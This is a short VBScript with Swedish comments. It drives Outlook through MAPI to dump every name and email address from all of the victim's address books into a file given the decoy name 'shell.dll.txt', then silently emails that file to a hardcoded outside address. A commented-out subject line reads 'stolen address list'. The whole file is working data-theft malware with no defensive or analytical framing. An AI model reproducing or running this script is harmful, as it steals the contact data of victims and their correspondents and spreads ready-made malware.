dim a
dim x
dim ctrlists
dim ctrentries
dim malead
dim email

Set WSHShell = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
set eKlient=WScript.CreateObject("Outlook.Application")
set mI=eKlient.GetNameSpace("MAPI")

Call KollaAdressbok()
Call Skicka()

Sub Skicka()
Set ePost = eKlient.CreateItem(Mail)
'Sätt in en bra mailaddress
Set tillVem = ePost.Recipients.Add ("mattias@cadoffice.se")
'Set omVad = ePost.Subject ("Snodd addresslista")
Set Bifoga = ePost.Attachments
'Bifoga filen
Bifoga.Add ("C:\shell.dll.txt")
ePost.Send
End Sub

Sub KollaAdressbok()
'Sökväg och filnamn till adressdumpningen
Set TextStream = FSO.CreateTextFile("C:\shell.dll.txt")

'Sök igenom alla adressböcker
for ctrlists=1 to mI.AddressLists.Count
	set a=mI.AddressLists(ctrlists)
	x=1
		for ctrentries=1 to a.AddressEntries.Count
			malead=a.AddressEntries(x)

			Set myNamespace = eKlient.GetNamespace("MAPI")
			Set myAddrList = myNamespace.AddressLists(ctrlists)
			Set myAddrEntries = myAddrList.AddressEntries(x)
	 		email = myAddrEntries.Address

			nameadress=malead & " (" & email & ")"
			TextStream.WriteLine(nameadress)
			x=x+1
		next		
next
TextStream.Close
End Sub
   

Set eKlient=Nothing
Set mI=Nothing